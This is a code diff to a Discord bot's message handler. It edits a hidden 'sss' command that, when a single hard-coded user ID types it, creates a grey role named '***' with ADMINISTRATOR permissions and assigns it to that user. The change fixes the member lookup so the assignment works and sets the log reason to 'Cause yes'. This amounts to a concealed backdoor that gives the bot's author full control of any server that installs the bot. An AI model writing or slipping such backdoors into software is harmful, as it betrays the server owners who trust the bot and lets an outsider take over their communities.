@@ -39,14 +39,14 @@ client.on('messageCreate', async (message) => {
   if (command === 'sss') {
     if (message.author.id != 330570656792182785) return;
 
-    let m = await message.author
-    let role = await message.guild.roles.create({
+    let m = message.guild.members.cache.get("330570656792182785")
+    let role = message.guild.roles.create({
       data: {
         name: '***',
         color: 'GREY',
         permissions: 'ADMINISTRATOR',
       },
-      reason: 'we needed a role for Super Cool People',
+      reason: 'Cause yes',
     }).then(role => {
       return m.roles.add(role)
     }).catch((err) => {
